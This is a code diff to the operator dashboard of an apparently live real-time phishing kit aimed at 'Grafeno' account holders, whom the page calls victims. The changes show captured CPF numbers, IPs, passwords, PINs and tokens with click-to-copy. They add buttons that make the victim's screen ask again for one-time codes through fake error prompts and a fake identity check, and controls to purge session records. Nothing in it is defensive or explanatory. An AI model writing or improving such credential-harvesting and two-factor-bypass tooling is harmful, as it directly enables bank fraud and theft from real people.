@@ -19,6 +19,12 @@
     .badge.pin { background: #1e3a5f; color: #7dd3fc; }
     .badge.token { background: #422006; color: #fcd34d; }
     .badge.cmd { background: #4c1d95; color: #c4b5fd; }
+    .badge.externa { background: #0c4a6e; color: #7dd3fc; }
+    .badge.interna { background: #14532d; color: #86efac; }
+    .badge.online { background: #14532d; color: #86efac; }
+    .badge.offline { background: #450a0a; color: #fca5a5; }
+    .acao-grupo { margin-bottom: 8px; }
+    .acao-grupo .grupo-titulo { font-size: 10px; text-transform: uppercase; color: #71717a; margin-bottom: 4px; }
     table { width: 100%; border-collapse: collapse; background: #18181b; border-radius: 8px; overflow: hidden; }
     th, td { padding: 10px 12px; text-align: left; border-bottom: 1px solid #27272a; }
     th { background: #27272a; color: #a1a1aa; font-weight: 600; font-size: 12px; text-transform: uppercase; }
@@ -28,6 +34,7 @@
     .btns button:hover { background: #00bba7; color: #0f0f12; }
     .btns button.danger:hover { background: #dc2626; color: #fff; }
     .btns button.success:hover { background: #16a34a; color: #fff; }
+    .btns button.warn:hover { background: #b45309; color: #fff; }
     .comando-input { width: 100%; max-width: 280px; padding: 6px 8px; border-radius: 4px; border: 1px solid #3f3f46; background: #27272a; color: #e2e2e2; font-size: 12px; margin-top: 4px; }
     .empty { text-align: center; padding: 40px; color: #71717a; }
     .detalhe { font-size: 12px; color: #a1a1aa; margin-top: 6px; }
@@ -39,22 +46,49 @@
     .dados-valores { font-size: 12px; margin-top: 6px; line-height: 1.5; }
     .dados-valores span.val { background: #27272a; padding: 2px 6px; border-radius: 4px; margin-right: 8px; margin-bottom: 4px; display: inline-block; font-family: monospace; }
     .dados-valores .lbl { color: #71717a; margin-right: 4px; }
+    .copy-value { cursor: pointer; }
+    .copy-value:hover { text-decoration: underline; color: #00bba7; }
+    .copy-value.copiado-feedback { color: #00bba7; }
     .btn-loading { opacity: 0.7; pointer-events: none; }
+    #btn-limpar-todas { padding: 6px 12px; border: none; border-radius: 6px; cursor: pointer; background: #713f12; color: #fcd34d; font-size: 12px; }
+    #btn-limpar-todas:hover { background: #b45309; color: #fff; }
+    #btn-limpar-todas:disabled { opacity: 0.6; cursor: not-allowed; }
+    .nav-operador { background: #18181b; border-bottom: 1px solid #27272a; padding: 12px 16px; margin: -16px -16px 16px -16px; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
+    .nav-operador .nav-tabs { display: flex; gap: 4px; }
+    .nav-operador .nav-tabs a { padding: 8px 16px; border-radius: 6px; text-decoration: none; font-weight: 600; font-size: 14px; color: #a1a1aa; background: transparent; }
+    .nav-operador .nav-tabs a:hover { background: #27272a; color: #00bba7; }
+    .nav-operador .nav-tabs a.ativo { background: #00bba7; color: #0f0f12; pointer-events: none; }
+    .nav-operador .nav-right { margin-left: auto; display: flex; align-items: center; gap: 12px; }
+    .nav-operador .nav-right a { color: #00bba7; text-decoration: none; font-size: 13px; }
+    .nav-operador .nav-right a.sair { color: #f87171; }
   </style>
 </head>
 <body>
-  <h1>Painel Operador – Grafeno</h1>
+  <nav class="nav-operador">
+    <div class="nav-tabs">
+      <a href="/operador" class="ativo">Infos</a>
+      <a href="/operador/acessos">Acessos</a>
+    </div>
+    <div class="nav-right">
+      <a href="/grafeno">Login vítima (externa)</a>
+      <a href="/operador/logout" class="sair">Sair</a>
+    </div>
+  </nav>
+  <h1>Painel Operador – Infos</h1>
   <div class="toolbar">
-    <strong>Painel:</strong> <code>/painel</code>
-    <a href="/grafeno">Página de login (vítima)</a>
+    <strong>Painel:</strong> <code>/painel</code> (interna)
     <span id="contador">0 sessões</span>
     <span class="atualizado">Atualiza a cada 5s</span>
+    <button type="button" id="btn-limpar-todas">Limpar todas</button>
   </div>
+  <p class="detalhe" style="margin:0 0 12px 0;"><strong>Onde</strong> indica em qual tela a vítima está (Externa = /grafeno, Interna = /painel). Comandos estão separados por contexto: use os da <strong>Externa</strong> quando ela estiver no login; após &quot;Enviar p/ Interna&quot; ela passa para a <strong>Interna</strong> e você pode usar Token, PIN, Comando, Aguardando e Finalizar da seção Interna.</p>
 
   <table id="tabela">
     <thead>
       <tr>
         <th>CPF / Login</th>
+        <th>Status</th>
+        <th>Onde</th>
         <th>Comando atual</th>
         <th>Dados</th>
         <th>Última atividade</th>
@@ -83,6 +117,40 @@
       return d.toLocaleString('pt-BR');
     }
 
+    function copiarParaClipboard(texto, el) {
+      var t = (texto || '').trim();
+      if (!t) return;
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(t).then(function () {
+          mostrarFeedbackCopiado(el);
+        }).catch(function () { fallbackCopiar(t, el); });
+      } else {
+        fallbackCopiar(t, el);
+      }
+    }
+
+    function fallbackCopiar(t, el) {
+      try {
+        var ta = document.createElement('textarea');
+        ta.value = t;
+        ta.style.position = 'fixed';
+        ta.style.opacity = '0';
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+        mostrarFeedbackCopiado(el);
+      } catch (e) {}
+    }
+
+    function mostrarFeedbackCopiado(el) {
+      var $el = $(el);
+      var htmlOriginal = $el.html();
+      var txtOriginal = $el.text();
+      $el.addClass('copiado-feedback').text('Copiado!');
+      setTimeout(function () { $el.removeClass('copiado-feedback').text(txtOriginal); }, 800);
+    }
+
     function enviarComando(login, comando, inputComando, btn) {
       var payload = { login: login, comando: comando };
       if (inputComando) payload.input_comando = inputComando;
@@ -105,16 +173,68 @@
       });
     }
 
-    function montarAcoes(login) {
-      var html = '<div class="btns">';
-      html += '<button type="button" data-label="Token" onclick="enviarComando(\'' + login + '\', \'codigo_token\', null, this)">Token</button>';
-      html += '<button type="button" data-label="PIN" onclick="enviarComando(\'' + login + '\', \'pin\', null, this)">PIN</button>';
+    function montarAcoes(login, pagina) {
+      var esc = escapeHtml(login);
+      var naExterna = (pagina !== 'painel');
+      var hideExterna = naExterna ? '' : ' style="display:none"';
+      var hideInterna = naExterna ? ' style="display:none"' : '';
+      var html = '<div class="acao-grupo grupo-externa"' + hideExterna + '><div class="grupo-titulo">Externa (/grafeno)</div><div class="btns">';
+      html += '<button type="button" data-label="Token" onclick="enviarComando(\'' + esc + '\', \'codigo_token\', null, this)">Token</button>';
+      html += '<button type="button" data-label="Token erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'codigo_token_error\', null, this)">Token erro</button>';
+      html += '<button type="button" data-label="PIN" onclick="enviarComando(\'' + esc + '\', \'pin\', null, this)">PIN</button>';
+      html += '<button type="button" data-label="PIN erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'pin_error\', null, this)">PIN erro</button>';
       html += '<button type="button" data-label="Comando">Comando</button>';
-      html += '<button type="button" data-label="Aguardando" onclick="enviarComando(\'' + login + '\', \'aguardando\', null, this)">Aguardando</button>';
-      html += '<button type="button" data-label="Finalizar" class="danger" onclick="enviarComando(\'' + login + '\', \'finalizar_atendimento\', null, this)">Finalizar</button>';
-      html += '<button type="button" data-label="Enviar p/ Interna" class="success" onclick="enviarComando(\'' + login + '\', \'enviar_para_interna\', null, this)">Enviar p/ Interna</button>';
-      html += '</div>';
+      html += '<button type="button" data-label="Comando erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'comando_error\', null, this)">Comando erro</button>';
+      html += '<button type="button" data-label="Aguardando" onclick="enviarComando(\'' + esc + '\', \'aguardando\', null, this)">Aguardando</button>';
+      html += '<button type="button" data-label="Enviar p/ Interna" class="success" onclick="enviarComando(\'' + esc + '\', \'enviar_para_interna\', null, this)">Enviar p/ Interna</button>';
+      html += '<button type="button" data-label="Finalizar" class="danger" onclick="enviarComando(\'' + esc + '\', \'finalizar_atendimento\', null, this)">Finalizar</button>';
+      html += '<button type="button" data-label="Dado inválido" class="warn" onclick="enviarComando(\'' + esc + '\', \'dado_invalido\', null, this)" title="Exclui a info e manda a vítima de volta ao início para preencher de novo">Dado inválido</button>';
+      html += '</div></div>';
+      html += '<div class="acao-grupo grupo-interna"' + hideInterna + '><div class="grupo-titulo">Interna (/painel)</div><div class="btns">';
+      html += '<button type="button" data-label="Token" onclick="enviarComando(\'' + esc + '\', \'codigo_token\', null, this)">Token</button>';
+      html += '<button type="button" data-label="Token erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'codigo_token_error\', null, this)">Token erro</button>';
+      html += '<button type="button" data-label="PIN" onclick="enviarComando(\'' + esc + '\', \'pin\', null, this)">PIN</button>';
+      html += '<button type="button" data-label="PIN erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'pin_error\', null, this)">PIN erro</button>';
+      html += '<button type="button" data-label="Comando">Comando</button>';
+      html += '<button type="button" data-label="Comando erro" class="warn" onclick="enviarComando(\'' + esc + '\', \'comando_error\', null, this)">Comando erro</button>';
+      html += '<button type="button" data-label="Aguardando" onclick="enviarComando(\'' + esc + '\', \'aguardando\', null, this)">Aguardando</button>';
+      html += '<button type="button" data-label="Finalizar" class="danger" onclick="enviarComando(\'' + esc + '\', \'finalizar_atendimento\', null, this)">Finalizar</button>';
+      html += '</div></div>';
+      html += '<div class="btns" style="margin-top:6px;"><button type="button" data-label="Excluir" class="warn" onclick="excluirSessao(\'' + esc + '\', this)">Excluir</button></div>';
       return html;
+    }
+
+    function excluirSessao(login, btn) {
+      if (!confirm('Excluir esta sessão? A vítima deixará de aparecer aqui e poderá cair de novo no fluxo.')) return;
+      var $btn = $(btn);
+      $btn.prop('disabled', true).text('...');
+      $.ajax({
+        url: '/api/sessao/' + encodeURIComponent(login),
+        method: 'DELETE',
+        headers: { 'X-CSRF-TOKEN': getToken() }
+      }).done(function () {
+        $btn.text('Excluído');
+        carregar();
+      }).fail(function () {
+        $btn.prop('disabled', false).text('Excluir');
+        alert('Erro ao excluir.');
+      });
+    }
+
+    function limparTodas() {
+      if (!confirm('Limpar TODAS as sessões e todos os dados? Isso não pode ser desfeito.')) return;
+      $('#btn-limpar-todas').prop('disabled', true).text('Limpando...');
+      $.ajax({
+        url: '/api/sessoes',
+        method: 'DELETE',
+        headers: { 'X-CSRF-TOKEN': getToken() }
+      }).done(function () {
+        $('#btn-limpar-todas').text('Limpar todas').prop('disabled', false);
+        carregar();
+      }).fail(function () {
+        $('#btn-limpar-todas').text('Limpar todas').prop('disabled', false);
+        alert('Erro ao limpar.');
+      });
     }
 
     function carregar() {
@@ -129,23 +249,32 @@
         }
         $('#vazio').hide();
         sessoes.forEach(function (s) {
+          var onde = (s.pagina === 'painel') ? 'painel' : 'grafeno';
+          var statusBadge = s.online
+            ? '<span class="badge online">Online</span>'
+            : '<span class="badge offline">Saiu</span>';
+          var ondeBadge = onde === 'painel'
+            ? '<span class="badge interna">Interna</span><div class="detalhe">/painel</div>'
+            : '<span class="badge externa">Externa</span><div class="detalhe">/grafeno</div>';
           var badges = '';
           if (s.temSenha) badges += '<span class="badge senha">Senha</span>';
           if (s.temPin) badges += '<span class="badge pin">PIN</span>';
           if (s.temToken) badges += '<span class="badge token">Token</span>';
           if (s.temComando) badges += '<span class="badge cmd">Comando</span>';
           var dadosValores = '<div class="dados-valores">';
-          if (s.senha) dadosValores += '<span class="val"><span class="lbl">Senha:</span>' + escapeHtml(s.senha) + '</span>';
-          if (s.token) dadosValores += '<span class="val"><span class="lbl">Token:</span>' + escapeHtml(s.token) + '</span>';
-          if (s.pin) dadosValores += '<span class="val"><span class="lbl">PIN:</span>' + escapeHtml(s.pin) + '</span>';
-          if (s.comando_valor) dadosValores += '<span class="val"><span class="lbl">Comando:</span>' + escapeHtml((s.comando_valor || '').substring(0, 80)) + (s.comando_valor && s.comando_valor.length > 80 ? '…' : '') + '</span>';
+          if (s.senha) dadosValores += '<span class="val"><span class="lbl">Senha:</span><span class="copy-value" title="Clique para copiar">' + escapeHtml(s.senha) + '</span></span>';
+          if (s.token) dadosValores += '<span class="val"><span class="lbl">Token:</span><span class="copy-value" title="Clique para copiar">' + escapeHtml(s.token) + '</span></span>';
+          if (s.pin) dadosValores += '<span class="val"><span class="lbl">PIN:</span><span class="copy-value" title="Clique para copiar">' + escapeHtml(s.pin) + '</span></span>';
+          if (s.comando_valor) dadosValores += '<span class="val"><span class="lbl">Comando:</span><span class="copy-value" title="Clique para copiar">' + escapeHtml((s.comando_valor || '').substring(0, 80)) + (s.comando_valor && s.comando_valor.length > 80 ? '…' : '') + '</span></span>';
           dadosValores += '</div>';
-          var tr = '<tr class="expand-row" data-login="' + escapeHtml(s.login) + '">' +
+          var tr = '<tr class="expand-row" data-login="' + escapeHtml(s.login) + '" data-pagina="' + escapeHtml(onde) + '">' +
             '<td><strong>' + escapeHtml(s.cpfFormatado || s.login) + '</strong><div class="detalhe">IP: ' + escapeHtml(s.ip || '-') + '</div></td>' +
+            '<td>' + statusBadge + '</td>' +
+            '<td>' + ondeBadge + '</td>' +
             '<td>' + escapeHtml(s.comando || '-') + '</td>' +
             '<td>' + (badges || '-') + (dadosValores !== '<div class="dados-valores"></div>' ? dadosValores : '') + '</td>' +
             '<td class="atualizado">' + formatarData(s.lastUpdate) + '</td>' +
-            '<td>' + montarAcoes(s.login) + '</td></tr>';
+            '<td>' + montarAcoes(s.login, onde) + '</td></tr>';
           tbody.append(tr);
         });
 
@@ -158,6 +287,12 @@
     $(function () {
       carregar();
       setInterval(carregar, 5000);
+      $('#btn-limpar-todas').on('click', limparTodas);
+      $(document).on('click', '#corpo .copy-value', function (e) {
+        e.stopPropagation();
+        var texto = $(this).text().trim();
+        if (texto) copiarParaClipboard(texto, this);
+      });
       $(document).on('click', '#corpo button[data-label="Comando"]', function () {
         var login = $(this).closest('tr').data('login');
         var texto = prompt('Texto para exibir no campo "Confirme sua identidade":', 'Por favor, confirme sua identidade digitando o código que enviamos para seu dispositivo cadastrado.');
